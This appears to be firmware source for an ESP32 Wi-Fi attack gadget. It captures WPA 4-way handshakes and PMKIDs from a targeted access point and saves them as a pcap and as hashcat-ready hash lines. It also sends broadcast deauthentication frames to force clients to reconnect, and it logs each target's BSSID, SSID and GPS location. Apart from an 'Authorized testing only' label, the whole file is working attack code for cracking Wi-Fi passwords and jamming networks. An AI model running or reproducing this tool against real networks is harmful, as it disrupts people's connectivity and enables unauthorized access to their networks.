// AWOKxDAG — WPA handshake / PMKID capture (compiled as part of the sketch; see awok_common.h)

// ---- Handshake / PMKID capture ------------------------------------------

void writePcapLe16(File& file, uint16_t value) {
  uint8_t bytes[2] = {static_cast<uint8_t>(value & 0xFF),
                      static_cast<uint8_t>((value >> 8) & 0xFF)};
  file.write(bytes, 2);
}

void writePcapLe32(File& file, uint32_t value) {
  uint8_t bytes[4] = {
      static_cast<uint8_t>(value & 0xFF),
      static_cast<uint8_t>((value >> 8) & 0xFF),
      static_cast<uint8_t>((value >> 16) & 0xFF),
      static_cast<uint8_t>((value >> 24) & 0xFF)};
  file.write(bytes, 4);
}

bool openHandshakePcap() {
  if (!ensureSdCard()) return false;
  SD.remove(kHandshakePcapPath);
  captureFile = SD.open(kHandshakePcapPath, FILE_WRITE);
  if (!captureFile) {
    sdReady = false;
    return false;
  }
  // pcap global header, link type 105 = LINKTYPE_IEEE802_11.
  writePcapLe32(captureFile, 0xA1B2C3D4);
  writePcapLe16(captureFile, 2);
  writePcapLe16(captureFile, 4);
  writePcapLe32(captureFile, 0);
  writePcapLe32(captureFile, 0);
  writePcapLe32(captureFile, kCaptureSlotBytes);
  writePcapLe32(captureFile, 105);
  captureFile.flush();
  captureFileOpen = captureFile.getWriteError() == 0;
  if (captureFileOpen) Serial.printf("[hs] pcap open %s\n", kHandshakePcapPath);
  return captureFileOpen;
}

void writeCaptureFrame(const CaptureFrame& frame) {
  if (!captureFileOpen) return;
  writePcapLe32(captureFile, frame.tsSec);
  writePcapLe32(captureFile, frame.tsUsec);
  writePcapLe32(captureFile, frame.len);
  writePcapLe32(captureFile, frame.origLen);
  captureFile.write(frame.data, frame.len);
  ++handshakeFramesWritten;
}

bool handshakeBssidMatches(const uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    if (mac[i] != handshakeTargetBssid[i]) return false;
  }
  return true;
}

// Runs in the Wi-Fi task. Keep it short: match target frames and enqueue.
void handshakeCaptureCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* packet =
      static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = packet->payload;
  const int length = packet->rx_ctrl.sig_len;
  if (length < 24) return;

  const uint8_t frameControl = payload[0];
  const uint8_t frameType = (frameControl >> 2) & 0x03;
  bool want = false;
  bool isEapol = false;

  if (frameType == 0x00) {  // management: keep target beacons/probe/assoc
    const uint8_t subtype = frameControl & 0xF0;
    if (handshakeBssidMatches(payload + 16) &&
        (subtype == 0x80 || subtype == 0x50 || subtype == 0x00 ||
         subtype == 0x10 || subtype == 0x20 || subtype == 0x30)) {
      want = true;
    }
  } else if (frameType == 0x02) {  // data: keep EAPOL (802.1X, ethertype 0x888E)
    int header = 24;
    const uint8_t subtype = (frameControl >> 4) & 0x0F;
    if (subtype & 0x08) header += 2;  // QoS control field
    const uint8_t frameControl1 = payload[1];
    const bool toDs = frameControl1 & 0x01;
    const bool fromDs = frameControl1 & 0x02;
    if (toDs && fromDs) header += 6;  // 4-address frame
    if (length >= header + 8) {
      const uint8_t* llc = payload + header;
      if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E) {
        isEapol = true;
        const uint8_t* bssid = fromDs ? payload + 10 : payload + 4;
        if (handshakeBssidMatches(bssid)) want = true;
      }
    }
  }
  if (!want) return;

  const int next = (captureHead + 1) % kCaptureQueueSlots;
  if (next == captureTail) return;  // queue full: drop
  CaptureFrame& slot = captureQueue[captureHead];
  const int copyLen = length > kCaptureSlotBytes ? kCaptureSlotBytes : length;
  memcpy(slot.data, payload, copyLen);
  slot.len = static_cast<uint16_t>(copyLen);
  slot.origLen = static_cast<uint16_t>(length);
  const uint32_t nowUs = micros();
  slot.tsSec = nowUs / 1000000UL;
  slot.tsUsec = nowUs % 1000000UL;
  slot.isEapol = isEapol;
  captureHead = next;
}

// Classify an EAPOL-Key frame and note PMKID presence, for the status display.
bool pmkidWritten = false;

// Write a hashcat 22000 PMKID line: WPA*01*PMKID*AP*STA*ESSIDhex***
void writePmkidHash(const uint8_t* pmkid, const uint8_t* sta) {
  if (!ensureSdCard()) return;
  File file = SD.open("/awokxdag/pmkid.txt", FILE_APPEND);
  if (!file) {
    sdReady = false;
    return;
  }
  file.print("WPA*01*");
  for (int i = 0; i < 16; ++i) file.printf("%02x", pmkid[i]);
  file.print('*');
  for (int i = 0; i < 6; ++i) file.printf("%02x", handshakeTargetBssid[i]);
  file.print('*');
  for (int i = 0; i < 6; ++i) file.printf("%02x", sta[i]);
  file.print('*');
  for (size_t i = 0; i < handshakeTargetSsid.length(); ++i) {
    file.printf("%02x", static_cast<uint8_t>(handshakeTargetSsid[i]));
  }
  file.println("***");
  file.close();
  Serial.println("[hs] PMKID written to pmkid.txt");
}

void inspectEapolFrame(const CaptureFrame& frame) {
  const uint8_t frameControl = frame.data[0];
  int header = 24;
  const uint8_t subtype = (frameControl >> 4) & 0x0F;
  if (subtype & 0x08) header += 2;
  const uint8_t frameControl1 = frame.data[1];
  if ((frameControl1 & 0x03) == 0x03) header += 6;
  const int llcEnd = header + 8;             // past LLC/SNAP + ethertype
  const int keyInfoOffset = llcEnd + 1 + 1 + 2 + 1;  // ver,type,len,desc
  if (frame.len < keyInfoOffset + 2) return;
  const uint16_t keyInfo =
      (frame.data[keyInfoOffset] << 8) | frame.data[keyInfoOffset + 1];
  const bool pairwise = keyInfo & 0x0008;
  const bool install = keyInfo & 0x0040;
  const bool ack = keyInfo & 0x0080;
  const bool mic = keyInfo & 0x0100;
  const bool secure = keyInfo & 0x0200;
  if (!pairwise) return;
  if (ack && !mic && !install) {
    handshakeMsgSeen |= 0x01;  // M1
  } else if (mic && !ack && !secure) {
    handshakeMsgSeen |= 0x02;  // M2
  } else if (mic && ack && install) {
    handshakeMsgSeen |= 0x04;  // M3
  } else if (mic && secure && !ack) {
    handshakeMsgSeen |= 0x08;  // M4
  }
  // PMKID detection: RSN PMKID KDE (00-0F-AC-04) inside M1 key data. Extract
  // the 16-byte PMKID and write a hashcat-ready line once.
  for (int i = llcEnd; i + 20 <= frame.len; ++i) {
    if (frame.data[i] == 0x00 && frame.data[i + 1] == 0x0F &&
        frame.data[i + 2] == 0xAC && frame.data[i + 3] == 0x04) {
      handshakePmkidSeen = true;
      if (!pmkidWritten) {
        const bool fromDs = frameControl1 & 0x02;
        const uint8_t* sta = fromDs ? frame.data + 4 : frame.data + 10;
        writePmkidHash(frame.data + i + 4, sta);
        pmkidWritten = true;
      }
      break;
    }
  }
}

void drawHandshake() {
  currentView = View::kHandshake;
  display.fillScreen(kBackground);
  const bool complete = (handshakeMsgSeen & 0x0F) == 0x0F;
  drawHeader("HANDSHAKE",
             handshakeTargetSsid.length() ? handshakeTargetSsid : "<hidden>");
  display.setTextSize(2);
  display.setTextColor(
      (complete || handshakePmkidSeen) ? kGood : kAccent, kBackground);
  display.setCursor(6, 50);
  if (handshakePmkidSeen && complete) {
    display.print("GOT PMKID+HS");
  } else if (complete) {
    display.print("GOT HANDSHAKE");
  } else if (handshakePmkidSeen) {
    display.print("GOT PMKID");
  } else {
    display.print("CAPTURING");
  }

  display.setTextSize(1);
  display.setTextColor(ILI9341_WHITE, kBackground);
  display.setCursor(6, 82);
  display.print("BSSID: ");
  display.print(macToString(handshakeTargetBssid));
  display.setCursor(6, 96);
  display.printf("Channel %d %sG   pulse %s",
                 static_cast<int>(handshakeChannel),
                 bandLabel(handshakeChannel),
                 handshakePulseEnabled ? "on" : "off");

  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 116);
  display.printf("EAPOL frames: %lu",
                 static_cast<unsigned long>(handshakeEapolCount));
  display.setCursor(6, 130);
  display.printf("Beacons kept: %lu",
                 static_cast<unsigned long>(handshakeBeaconCount));

  display.drawFastHLine(6, 148, 228, kPanel);
  display.setTextColor(kAccent, kBackground);
  display.setCursor(6, 156);
  display.print("4-WAY PROGRESS");
  for (int message = 0; message < 4; ++message) {
    const bool seen = handshakeMsgSeen & (1 << message);
    display.setTextColor(seen ? kGood : kMuted, kBackground);
    display.setCursor(6 + message * 58, 172);
    display.printf("M%d %s", message + 1, seen ? "ok" : "--");
  }

  display.setTextColor(handshakePmkidSeen ? kGood : kMuted, kBackground);
  display.setCursor(6, 192);
  display.printf("PMKID: %s", pmkidWritten ? "saved to pmkid.txt"
                                           : (handshakePmkidSeen ? "yes"
                                                                 : "not seen"));

  display.setTextColor(captureFileOpen ? kAccent : kWarn, kBackground);
  display.setCursor(6, 212);
  display.print(captureFileOpen ? "SD: latest_handshake.pcap"
                                : "SD unavailable; not saving");
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 232);
  display.print("Authorized testing only.");
  drawFooter("Back", handshakePulseEnabled ? "Pulse off" : "Pulse on");
}

void sendDeauthPulse() {
  if (deauthTargetCount == 0) return;
  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t frame[26];
  buildDeauthFrame(frame, broadcast, handshakeTargetBssid, 0xC0);
  for (int i = 0; i < 3; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
  }
}

void startHandshakeCapture() {
  if (deauthTargetCount == 0) {
    drawWifiAudit();
    return;
  }
  deauthAttackActive = false;
  memcpy(handshakeTargetBssid, deauthTargets[0].bssid, 6);
  handshakeChannel = deauthTargets[0].channel;
  handshakeTargetSsid = deauthTargets[0].ssid;
  handshakeEapolCount = 0;
  handshakeBeaconCount = 0;
  handshakeFramesWritten = 0;
  handshakeMsgSeen = 0;
  handshakePmkidSeen = false;
  pmkidWritten = false;
  captureHead = 0;
  captureTail = 0;
  handshakeStartMs = millis();
  lastHandshakeDrawMs = 0;
  lastHandshakePulseMs = 0;
  signalMonitorActive = false;

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&handshakeCaptureCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(handshakeChannel, WIFI_SECOND_CHAN_NONE);

  captureFileOpen = openHandshakePcap();
  handshakeCaptureActive = true;
  Serial.printf("[hs] capturing %s on channel %d\n",
                macToString(handshakeTargetBssid).c_str(),
                static_cast<int>(handshakeChannel));
  drawHandshake();
}

void stopHandshakeCapture() {
  handshakeCaptureActive = false;
  esp_wifi_set_promiscuous(false);
  if (captureFileOpen) {
    captureFile.flush();
    captureFile.close();
    captureFileOpen = false;
  }
  // Sidecar CSV recording where and against whom the capture ran.
  if (ensureSdCard()) {
    const bool exists = SD.exists("/awokxdag/latest_handshake_loc.csv");
    File location = SD.open("/awokxdag/latest_handshake_loc.csv", FILE_APPEND);
    if (location) {
      if (!exists) {
        location.println(
            "uptime_ms,target_bssid,ssid,channel,eapol_frames,pmkid,"
            "m1m2m3m4,latitude,longitude,altitude_m");
      }
      location.printf("%lu,%s,%s,%d,%lu,%s,%d%d%d%d%s\n",
                      static_cast<unsigned long>(millis()),
                      macToString(handshakeTargetBssid).c_str(),
                      csvField(handshakeTargetSsid).c_str(),
                      static_cast<int>(handshakeChannel),
                      static_cast<unsigned long>(handshakeEapolCount),
                      handshakePmkidSeen ? "yes" : "no",
                      (handshakeMsgSeen & 0x01) ? 1 : 0,
                      (handshakeMsgSeen & 0x02) ? 1 : 0,
                      (handshakeMsgSeen & 0x04) ? 1 : 0,
                      (handshakeMsgSeen & 0x08) ? 1 : 0,
                      gpsCsvFields().c_str());
      location.close();
    }
  }
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, false);
  Serial.printf("[hs] stopped; %lu frame(s) written\n",
                static_cast<unsigned long>(handshakeFramesWritten));
}

void updateHandshakeCapture() {
  if (!handshakeCaptureActive || currentView != View::kHandshake) return;
  // Drain the capture queue to SD and update status counters.
  while (captureTail != captureHead) {
    const CaptureFrame& frame = captureQueue[captureTail];
    if (frame.isEapol) {
      ++handshakeEapolCount;
      inspectEapolFrame(frame);
    } else {
      ++handshakeBeaconCount;
    }
    writeCaptureFrame(frame);
    captureTail = (captureTail + 1) % kCaptureQueueSlots;
  }
  const uint32_t now = millis();
  if (handshakePulseEnabled && now - lastHandshakePulseMs >= kHandshakePulseMs) {
    lastHandshakePulseMs = now;
    sendDeauthPulse();
  }
  if (now - lastHandshakeDrawMs >= kHandshakeRedrawMs) {
    lastHandshakeDrawMs = now;
    if (captureFileOpen) captureFile.flush();
    drawHandshake();
  }
}

